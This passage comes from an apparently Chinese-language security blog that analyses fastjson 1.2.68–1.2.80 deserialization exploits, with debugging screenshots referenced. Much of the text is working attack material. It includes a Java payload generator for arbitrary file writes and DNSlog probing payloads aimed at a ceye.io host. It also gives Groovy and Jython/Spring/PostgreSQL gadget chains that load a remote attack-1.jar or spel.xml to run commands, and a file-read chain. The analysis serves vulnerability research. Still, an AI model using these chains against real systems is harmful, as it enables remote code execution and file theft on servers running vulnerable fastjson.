&#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder bytes = new StringBuilder(&quot;0&quot;);</span><br><span class="line">        for (int i = 0; i &lt; nums * 8192; i++) &#123;</span><br><span class="line">            bytes.append(&quot;,0&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return String.format(&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\&quot;delegate\&quot;:%s,&quot; +</span><br><span class="line">                        &quot;\&quot;boms\&quot;:[&#123;\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;bytes\&quot;:[%s]&#125;]&#125;&quot;,</span><br><span class="line">                AUTOCLOSEABLE_TAG, inputStream, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 读取文件内容字符串</span><br><span class="line">    *</span><br><span class="line">    * @param file 文件路径</span><br><span class="line">    * @return 返回字符串</span><br><span class="line">    */</span><br><span class="line">    public static String readFile(File file) &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            result = FileUtils.readFileToString(file);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成普通 payload</span><br><span class="line">    *</span><br><span class="line">    * @param payloadFile    写入文件本地存储位置</span><br><span class="line">    * @param targetFilePath 写出目标文件位置</span><br><span class="line">    * @return 返回 payload</span><br><span class="line">    */</span><br><span class="line">    public static String generatePayload(String payloadFile, String targetFilePath) &#123;</span><br><span class="line">        File   file        = new File(payloadFile);</span><br><span class="line">        String fileContent = readFile(file);</span><br><span class="line">        if (!&quot;&quot;.equals(fileContent)) &#123;</span><br><span class="line">            return bypassSpecializedClass(</span><br><span class="line">                    useCurrencyTriggerAllGetter(</span><br><span class="line">                            generateBOMInputStream(</span><br><span class="line">                                    generateTeeInputStream(generateCharSequenceInputStream(fileContent, false),</span><br><span class="line">                                            generateWriterOutputStream(</span><br><span class="line">                                                    generateFileWriterWithEncoding(targetFilePath, false),</span><br><span class="line">                                                    false),</span><br><span class="line">                                            false),</span><br><span class="line">                                    (int) file.length()),</span><br><span class="line">                            false));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 生成引用型 payload</span><br><span class="line">    *</span><br><span class="line">    * @param payloadFile    写入文件本地存储位置</span><br><span class="line">    * @param targetFilePath 写出目标文件位置</span><br><span class="line">    * @return 返回 payload</span><br><span class="line">    */</span><br><span class="line">    public static String generateRefPayload(String payloadFile, String targetFilePath) &#123;</span><br><span class="line">        File   file        = new File(payloadFile);</span><br><span class="line">        String fileContent = readFile(file);</span><br><span class="line">        if (!&quot;&quot;.equals(fileContent)) &#123;</span><br><span class="line">            return bypassSpecializedClass(</span><br><span class="line">                    useCurrencyTriggerAllGetter(</span><br><span class="line">                            &quot;&#123;\&quot;writer\&quot;:&quot; + generateFileWriterWithEncoding(targetFilePath, true) +</span><br><span class="line">                                    &quot;,\&quot;outputStream\&quot;:&quot; + generateWriterOutputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.writer\&quot;&#125;&quot;, true) +</span><br><span class="line">                                    &quot;,\&quot;charInputStream\&quot;:&quot; + generateCharSequenceInputStream(fileContent, true) +</span><br><span class="line">                                    &quot;,\&quot;teeInputStream\&quot;:&quot; + generateTeeInputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.charInputStream\&quot;&#125;&quot;, &quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.outputStream\&quot;&#125;&quot;, true) +</span><br><span class="line">                                    &quot;,\&quot;inputStream\&quot;:&quot; + generateBOMInputStream(&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.teeInputStream\&quot;&#125;&quot;, (int) file.length()) + &quot;&#125;&quot;</span><br><span class="line">                            , true</span><br><span class="line">                    )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String file   = &quot;E:/a/12.txt&quot;;</span><br><span class="line">        String target = &quot;E:/a/1234.txt&quot;;</span><br><span class="line"></span><br><span class="line">        // 正常调用 payload 生成</span><br><span class="line">        String payload = generatePayload(file, target);</span><br><span class="line"></span><br><span class="line">        // 引用类型 payload 生成</span><br><span class="line">        String payloadWithRef = generateRefPayload(file, target);</span><br><span class="line"></span><br><span class="line">//		以下三种调用方式均可兼容，触发反序列化</span><br><span class="line">//        JSON.parse(payload);</span><br><span class="line">//		JSON.parse(payloadWithRef);</span><br><span class="line">        JSON.parseObject(payloadWithRef);</span><br><span class="line">//		JSON.parseObject(payloadWithRef,POC.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><p>在这条反序列化调用链中，我们一共使用了 fastjson 的如下几个特性：</p>
<ol>
<li>fastjson 优先将 json 中的参数交给构造方法去调用，这扩展了 fastjson 反序列化的漏洞面，不局限于 getter&#x2F;setter 方法，也可以使用构造方法的参数传递变量，进行类的初始化；</li>
<li>对 getter 方法的定义宽泛，无需有相关成员变量，只要命名为 “getXXX” 类型的方法，fastjson 就会认为其为 getter 方法进行调用，这就不局在限于成员变量中的 getter 方法，只要叫 getXXX 的方法都可以成为触发漏洞的方法；</li>
<li>反序列化一个 Map（JSONObject 也是 Map 的实现） 对象时，会使用 MapSerializer 的 writer 方法执行获取 value 对象的各项属性的操作，会反射调用 value 对象中的 getter 方法；</li>
<li>如果反序列化的指定类是 <code>java.util.Currency</code> ，使用 MiscCodec 的 deserialze 方法，获取 currencyCode 或者 currency 的值，并调用其 toString 方法，如果这个值的类是 JSONObject 方法，将会调用 JSONObject 的 toString，也就是 JSON.toJSONString，触发 getter&#x2F;setter 方法的调用；</li>
<li>指定类型反序列化时，不论参数是否对应，fastjson 都会去创建对象，并处理相关内容，因此使用外层嵌套可以绕过指定期待类进行反序列化；</li>
<li>使用 AutoCloseable 子类绕过 AutoType 检测，尝试读写文件。</li>
</ol>
<p>结合这 6 条特性， 可以通杀服务器上任意一种写法的 json 解析，并且可以指定调用任意符合条件的 getter&#x2F;setter&#x2F;构造方法，大大扩大了漏洞挖掘的范围。</p>
<h1 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson-1.2.80"></a>fastjson-1.2.80</h1><h2 id="1-2-68修复"><a href="#1-2-68修复" class="headerlink" title="1.2.68修复"></a>1.2.68修复</h2><p>对过滤的expectClass进行了修改，与1.2.68相比，新增了3个新的类，并且将原来的Class类型的判断修改为hash的判断。</p>
<p><img src="/images/20230524140253.png"></p>
<p><img src="/images/20230524135702.png"></p>
<p>查询<a href="https://github.com/LeadroyaL/fastjson-blacklist">黑名单</a>,分别为：</p>
<ol>
<li>java.lang.Runnable</li>
<li>java.lang.Readable</li>
<li>java.lang.AutoCloseable</li>
</ol>
<p>把AutoCloseable禁了，在1.2.68分析的时候还提到了一个利用类：Throwable.class</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;1.zj96tn.ceye.io&quot;&#125;&#125;&#125;
</code></pre>
<h3 id="版本探测-2"><a href="#版本探测-2" class="headerlink" title="版本探测-2"></a>版本探测-2</h3><pre><code>&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;1.zj96tn.ceye.io&quot;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;message&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;2.zj96tn.ceye.io&quot;&#125;&#125;&#125;&#125;
</code></pre>
<h3 id="报错探测依赖库"><a href="#报错探测依赖库" class="headerlink" title="报错探测依赖库"></a>报错探测依赖库</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Character&quot;&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mysql.jdbc.Driver&quot;&#125;
</code></pre>
<h3 id="dnslog探测依赖库"><a href="#dnslog探测依赖库" class="headerlink" title="dnslog探测依赖库"></a>dnslog探测依赖库</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;country&quot;:&quot;zj96tn.ceye.io&quot;,&quot;language&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.python.antlr.ParseException&quot;&#125;&#125;&#125;&#125;&#125;
</code></pre>
<h3 id="grovvy"><a href="#grovvy" class="headerlink" title="grovvy"></a>grovvy</h3><p>maven依赖：</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
    &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;
    &lt;version&gt;3.0.13&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>利用：</p>
<pre><code>//两次parse
&#123;
&quot;@type&quot;:&quot;java.lang.Exception&quot;,
&quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,
&quot;unit&quot;:&#123;&#125;
&#125;

&#123;
&quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,
&quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,
&quot;config&quot;:&#123;
&quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,
&quot;classpathList&quot;:&quot;http://127.0.0.1:8080/&quot;
&#125;
&#125;
</code></pre>
<p>poc：</p>
<pre><code>//1.2.76-1.2.80
public class FastJson_Groovy_Gadget_Test &#123;
    private static String poc1 = &quot;&#123;\n&quot; +
            &quot;    \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +
            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\n&quot; +
            &quot;    \&quot;unit\&quot;:&#123;&#125;\n&quot; +
            &quot;&#125;&quot;;
    private static String poc2 = &quot;&#123;\n&quot; +
            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.ProcessingUnit\&quot;,\n&quot; +
            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\&quot;,\n&quot; +
            &quot;    \&quot;config\&quot;:&#123;\n&quot; +
            &quot;        \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilerConfiguration\&quot;,\n&quot; +
            &quot;        \&quot;classpathList\&quot;:\&quot;http://127.0.0.1:8000/attack-1.jar\&quot;\n&quot; +
            &quot;    &#125;\n&quot; +
            &quot;&#125;&quot;;
    public static void main(String[] args) throws IOException &#123;
        try &#123;
            JSON.parseObject(poc1);
        &#125; catch (Exception e)&#123;&#125;
        JSON.parseObject(poc2);
    &#125;
&#125;
</code></pre>
<p>恶意server（attack-1.jar）：</p>
<pre><code>import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;
import java.io.IOException;
@GroovyASTTransformation(phase= CompilePhase.CONVERSION)
public class Evil implements ASTTransformation &#123;
    public Evil() &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
        &#125; catch (IOException e) &#123;
        &#125;
    &#125;
    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) &#123;
    &#125;
&#125;
</code></pre>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>第一次parse：</p>
<p>当第一次传递的<code>@type</code>为<code>java.lang.Exception</code>，<code>checkAutoType</code>中因为<code>java.lang.Exception</code>在<code>mappings</code>中可以直接return。<code>clazz</code>获取到<code>java.lang.Exception</code>的class对象。<br><img src="/images/20230528215252.png"></p>
<p>由于<code>java.lang.Exception</code>继承自<code>Throwable</code> ，通过<code>getDeserializer</code> 函数拿到<code>Throwable</code> 的反序列化器<code>ThrowableDeserializer</code><br><img src="/images/20230528215840.png"></p>
<p>拿到反序列化器<code>ThrowableDeserializer</code> 后，继而调用序列化器接口方法<code>deserialze</code> 对后续json字符串进行反序列化<br><img src="/images/20230528220048.png"></p>
<p>在<code>ThrowableDeserializer#deserialze</code> 方法内，会对新的<code>@type</code>字段指向的类进行<code>checkAutoType</code>校验：传递<code>@type</code>字段作为其<code>typename</code>参数、<code>Throwable.class</code> 作为其<code>expectClass</code> 参数<br><img src="/images/20230528220255.png"></p>
<p>传递了期望类<code>Throwable.class</code>，在经过<code>if (autoTypeSupport || jsonType || expectClassFlag)</code> 时判断，利用<code>TypeUtils.loadClass</code> 获得<code>org.codehaus.groovy.control.CompilationFailedException</code>类对象。</p>
<p><img src="/images/20230528220530.png"></p>
<p>在后面会判断<code>clazz</code>类对象是否和<code>expectClass</code>期望类实现同一接口，如果是就添加到mappings中并return。</p>
<p><img src="/images/20230528221107.png"></p>
<p>回到<code>ThrowableDeserializer#deserialze</code>，之后他会去通过json数据中参数值获取对应解析器中对应的属性，<code>fieldInfo</code> 的对象，里面封装了属性名、属性值、属性类对象信息等。这里获取到<code>CompilationFailedException.unit</code>属性，类型为<code>ProcessingUnit</code>。</p>
<p><img src="/images/20230528221603.png"><br><img src="/images/20230528222044.png"></p>
<p>如果属性值不是属性类型的实例的话就会调用<code>TypeUtils.cast</code>方法，这个方法是重点。<br><img src="/images/20230528222349.png"></p>
<p>在<code>cast</code>方法中，会经过一些列的判断，最后因为我们传入的值JsonObject为空，他会调用到<code>config.getDeserializer(clazz)</code>，里面在获取反序列化解析器的时候会调用<code>putDeserializer(type, deserializer)</code>,将<code>type</code>和<code>deserializer</code>加入到<code>ParserConfig.deserializers</code>。这时成员类型<code>ProcessingUnit</code>就被加入到<code>deserializers</code>中。</p>
<p><img src="/images/20230528223122.png"><br><img src="/images/20230528223343.png"></p>
<p>之后调用<code>javaBeanDeser.createInstance</code>创建实例并返回，由于我们传入的是空，所以返回空</p>
<p><img src="/images/20230528224010.png"></p>
<p>需要注意的是，赋值给<code>value</code>后会调用<code>fieldDeserializer.setValue(ex, value)</code>进行设置，但是如果赋值空的话就会报错，所以在poc中需要try catch处理</p>
<p><img src="/images/20230528224318.png"></p>
<p>第二次parse:</p>
<p>@type字段指向<code>CompilationFailedException</code>的成员类型<code>ProcessingUnit</code>。由于<code>ProcessingUnit</code> 生成的反序列化器添加到<code>ParserConfig</code>中，在#1445行能够获取到<code>ProcessingUnit</code>类对象。<br><img src="/images/20230528224525.png"></p>
<p>之后利用这个反序列化器<code>ProcessingUnitJavaBeanDeserializer#deserialize</code>实现后续的json反序列化，并将<code>ProcessingUnit</code> 作为<code>expectClass</code>使用。</p>
<p><img src="/images/20230528225017.png"></p>
<p>凡继承自<code>ProcessingUnit</code> 的类都能被反序列化而绕过<code>checkAutoType</code>，例如我们使用的sink类<code>JavaStubCompilationUnit</code>。</p>
<p><img src="/images/20230528225124.png"></p>
<p>之后创建<code>JavaStubCompilationUnit</code>的<code>deserializer</code>，然后它的调用<code>deserialze</code>方法，<code>JavaStubCompilationUnit</code>没有无参构造，解析器会从json从获取参数的值，并调用他的有参构造器</p>
<p><img src="/images/20230528231101.png"></p>
<p>构造器中会不断调用父类的构造器，将JSON字符串中classpathList属性的值添加到classpath。</p>
<p><img src="/images/20230528231235.png"><br><img src="/images/20230528231713.png"></p>
<p>添加调用栈：</p>
<pre><code>&lt;init&gt;:167, GroovyClassLoader (groovy.lang)
&lt;init&gt;:183, GroovyClassLoader (groovy.lang)
lambda$setClassLoader$0:106, ProcessingUnit (org.codehaus.groovy.control)
run:-1, 1227074340 (org.codehaus.groovy.control.ProcessingUnit$$Lambda$1)
doPrivileged:-1, AccessController (java.security)
setClassLoader:103, ProcessingUnit (org.codehaus.groovy.control)
&lt;init&gt;:64, ProcessingUnit (org.codehaus.groovy.control)
&lt;init&gt;:180, CompilationUnit (org.codehaus.groovy.control)
&lt;init&gt;:161, CompilationUnit (org.codehaus.groovy.control)
&lt;init&gt;:46, JavaStubCompilationUnit (org.codehaus.groovy.tools.javac)
</code></pre>
<p>在<code>CompilationUnit</code>的构造函数中super调用完后，会调用<code>addPhaseOperations()</code><br><img src="/images/20230528232421.png"></p>
<p>其中调用<code>ASTTransformationVisitor.addPhaseOperations(this)</code></p>
<p><img src="/images/20230528232607.png"></p>
<p>调用<code>addGlobalTransforms(context)</code></p>
<p><img src="/images/20230528232640.png"></p>
<p>调用<code>doAddGlobalTransforms(context, true)</code>，主要看这个类</p>
<p><img src="/images/20230528232721.png"></p>
<p><code>transformLoader</code>是从<code>JavaStubCompilationUnit</code>对象中获取到的<code>GroovyClassLoader</code>，使用<code>getResources(String name)</code>从加载器中获取<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>文件下的资源</p>
<p><img src="/images/20230529194517.png"></p>
<p>跟进<code>getResources(String name)</code>，先从父类加载器加载，使用启动类加载器加载时，会从 Bootstrap classpath 对应的 jar 包或目录中加载资源。</p>
<p><img src="/images/20230529195111.png"></p>
<p><code>getBootstrapClassPath()</code>最终获取到的时<code>bcp</code>属性的值，也就是说从<code>bcp</code>中的 jar 包中加载资源</p>
<p><img src="/images/20230529195300.png"></p>
<p>然后回到<code>getResources</code>调用<code>findResources(name)</code>，调用<code>ucp</code>的<code>findResources()</code>，<code>ucp</code>是 URLClassPath 类型，里面存着我们的恶意远程server地址，封装成<code>Enumeration</code>对象返回。</p>
<p><img src="/images/20230529200158.png"></p>
<p>接下来会遍历这些<code>Enumeration</code>，获取存在<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>资源的service</p>
<p><img src="/images/20230529200512.png"></p>
<p>读取service中不以<code>#</code>开头的行放到<code>transformNames</code></p>
<p><img src="/images/20230529200653.png"></p>
<p>接着下面调用addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan)</p>
<p><img src="/images/20230529201006.png"></p>
<p>在该方法中依次加载并实例化了<code>transformNames</code>中的所有类，并且这些类需要:</p>
<ol>
<li>含有<code>@GroovyASTTransformation</code>注解</li>
<li>继承自<code>ASTTransformation</code></li>
</ol>
<p><img src="/images/20230529200948.png"></p>
<blockquote>
<p>1.2.76以下不适用原因:因为在1.2.76版本下没有cast调用</p>
</blockquote>
<h3 id="jython-spring-context-postgresql"><a href="#jython-spring-context-postgresql" class="headerlink" title="jython+spring-context+postgresql"></a>jython+spring-context+postgresql</h3><p>依赖：</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.jvnet.hudson.plugins&lt;/groupId&gt;
    &lt;artifactId&gt;jython&lt;/artifactId&gt;
    &lt;version&gt;1.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;
    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;
    &lt;version&gt;42.3.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>利用：</p>
<pre><code>public class FastJson_Jython_Pgsql_Gadget_Test &#123;
    public static void main(String[] args) &#123;
        String jsonStr = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.python.antlr.ParseException\&quot;,\&quot;type\&quot;:&#123;&#125;&#125;,&quot; +
                &quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.python.core.PyObject\&quot;,\&quot;@type\&quot;:\&quot;com.ziclix.python.sql.PyConnection\&quot;,&quot; +
                &quot;\&quot;connection\&quot;:&#123;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;org.postgresql.jdbc.PgConnection\&quot;,&quot; +
                &quot;\&quot;hostSpecs\&quot;:[&#123;\&quot;host\&quot;:\&quot;127.0.0.1\&quot;,\&quot;port\&quot;:2333&#125;],&quot; +
                &quot;\&quot;user\&quot;:\&quot;1azy\&quot;, \&quot;database\&quot;:\&quot;test\&quot;,&quot; +
                &quot;\&quot;info\&quot;:&#123;&quot; +
                &quot;\&quot;socketFactory\&quot;:\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;,&quot; +
                &quot;\&quot;socketFactoryArg\&quot;:\&quot;http://127.0.0.1:8000/spel.xml\&quot;&quot; +
                &quot;&#125;,&quot; +
                &quot;\&quot;url\&quot;:\&quot;\&quot;&quot; +
                &quot;&#125;&quot; +
                &quot;&#125;&quot; +
                &quot;&#125;&quot;;

        JSONObject obj1 = JSON.parseObject(jsonStr);
    &#125;
&#125;
</code></pre>
<p>spel.xml:</p>
<pre><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;
http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;constructor-arg value=&quot;calc.exe&quot; /&gt;
&lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;
&lt;/bean&gt;
&lt;/beans&gt;
</code></pre>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><code>ParseException</code>继承自<code>RuntimeException</code>，<code>RuntimeException</code>自<code>Throwable</code>，其中有个<code>PyObject</code>类型的属性type</p>
<p><img src="/images/20230531174857.png"></p>
<p><code>PyConnection</code>继承自<code>PyObject</code>，有个<code>Connection</code>类型的属性<code>connection</code></p>
<p><img src="/images/20230531175117.png"></p>
<p><code>PgConnection</code>实现了<code>BaseConnection</code>，<code>BaseConnection</code>继承自<code>Connection</code>接口，并且有个五个参数的构造函数，可以连接数据库。</p>
<p><img src="/images/20230531175404.png"></p>
<p>info内传入<code>socketFactory</code>为<code>ClassPathXmlApplicationContext</code>，<code>socketFactoryArg</code>为远程 bean 文件地址。在<code>getSocketFactory</code>方法内会对取出这些值，并调用<code>ObjectFactory.instantiate</code>实例化</p>
<p><img src="/images/20230531180757.png"></p>
<p>调试分析：</p>
<p>和groovy链一样的就不跟了，<code>ParseException</code>继承自<code>Exception</code>绕过<code>checkAutoType</code>，调用<code>TypeUtils.cast</code>把<code>type</code>属性传入，将<code>PyObject</code>类型保存到<code>this.deserializer</code>，不一样的是<code>PyObject</code>有无参构造，可以实例化，返回的<code>value</code>不为 null，所以下面调用<code>setValue()</code>不会报错，所以不用像 Groovy 链那样使用<code>try-catch</code>。  </p>
<p><img src="/images/20230531182921.png"><br><img src="/images/20230531183107.png"></p>
<p>之后通过<code>PyObject</code>对应的<code>deserializer</code>绕过<code>checkAutoType()</code>，然后通过<code>PyObject</code>作为<code>expectClass</code>绕过<code>checkAutoType()</code>，加载并返回<code>PyConnection</code></p>
<p><img src="/images/20230531183608.png"><br><img src="/images/20230531183634.png"></p>
<p>之后获取反序列器-&gt;反序列化-&gt;解析属性，跟进<code>JavaBeanDeserializer.deserialze()</code> -&gt; <code>DefaultFieldDeserializer.parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code>，返回<code>JavaBeanDeserializer</code>类型；  </p>
<p><img src="/images/20230531184633.png"></p>
<p>调用<code>fieldValueDeserilizer.deserialze</code>解析</p>
<p><img src="/images/20230531184758.png"></p>
<p>期望类为<code>java.sql.Connection</code>，typeName为<code>org.postgresql.jdbc.PgConnection</code>调用<code>checkAutoType</code>绕过，加载并返回<code>org.postgresql.jdbc.PgConnection</code></p>
<p><img src="/images/20230531185224.png"></p>
<p>调用<code>deserializer.deserialze</code>，下面会去遍历参数，当遍历到<code>HostSpecs</code>，会调用<code>parseField</code>—&gt;<code>getFieldValueDeserilizer</code>获取反序列化器，返回<code>ObjectArrayCode</code></p>
<p><img src="/images/20230531185832.png"></p>
<p>调用<code>ObjectArrayCode.deserialze</code>去反序列化</p>
<p><img src="/images/20230531190031.png"></p>
<p>跟进<code>parser.parseArray</code>，调用<code>deserializer.deserialze</code></p>
<p><img src="/images/20230531190253.png"></p>
<p>通过参数实例化了<code>HostSpec</code>对象并返回</p>
<p><img src="/images/20230531190410.png"></p>
<p>转换为数组类型，赋值给<code>hostSpecs</code>参数</p>
<p><img src="/images/20230531190907.png"></p>
<p>接着解析<code>info</code>属性，调用<code>getFieldValueDeserilizer</code>获取到解析器<code>MapDeserilizer</code></p>
<p><img src="/images/20230531192000.png"></p>
<p>调用<code>MapDeserilizer.deserialze</code>，其中调用了<code>parser.parseObject</code>，将<code>socketFactory</code>和<code>socketFactoryArg</code>的存入了 map 中</p>
<p><img src="/images/20230531192349.png"></p>
<p>然后将<code>value</code>放入<code>info</code>中，其他几个String参数也是一样</p>
<p><img src="/images/20230531192507.png"></p>
<p>接着调用五个参数的构造方法去实例化<code>PgConnection</code></p>
<p><img src="/images/20230531192656.png"></p>
<p>跟进到<code>PgConnection</code>的构造函数，调用了<code>ConnectionFactory.openConnection()</code></p>
<p><img src="/images/20230531192802.png"></p>
<p>跟进<code>connectionFactory.openConnectionImpl</code>-&gt;<code>SocketFactoryFactory.getSocketFactory</code>-&gt;<code>ObjectFactory.instantiate</code>，其中会去反射获取传入的<code>ClassPathXmlApplicationContext</code>的类并实例化，参数为<code>http://127.0.0.1:8000/spel.xml</code></p>
<p><img src="/images/20230531193213.png"></p>
<p>加载配置文件，实例化文件中的恶意对象。</p>
<p><img src="/images/20230531193327.png"></p>
<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>依赖：</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
    &lt;version&gt;1.8.6&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>利用：</p>
<pre><code>public class FastJson_Aspectj_ReadFile_Gadget_Test &#123;
    public static void main(String[] args) &#123;
        String jsonStr1 = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;&#125;&quot;;

        String jsonStr2 = &quot;&#123;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +
                &quot;\&quot;val\&quot;:&#123;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,&quot; +
                &quot;&#123;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;,&quot; +
                &quot;\&quot;newAnnotationProcessorUnits\&quot;:[&#123;&#125;]&quot; +
                &quot;&#125;&quot; +
                &quot;&#125;&quot; +
                &quot;&#125;&quot;;

        String jsonStr3 = &quot;&#123;\&quot;x\&quot;:&#123;&quot; +
                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\&quot;,&quot; +
                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\&quot;,&quot; +
                &quot;\&quot;fileName\&quot;:\&quot;E:/a/12.txt\&quot;&quot; +
                &quot;&#125;&quot; +
                &quot;&#125;&quot;;

        JSON.parseObject(jsonStr1);
        try &#123;
            JSON.parseObject(jsonStr2);
        &#125; catch (Exception e)&#123;
            Object obj3 = JSON.parseObject(jsonStr3);
            System.out.println(obj3);
        &#125;
    &#125;
&#125;
</code></pre>
<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>由于<code>SourceTypeCollisionException</code>的<code>newAnnotationProcessorUnits</code>参数是接口类型</p>
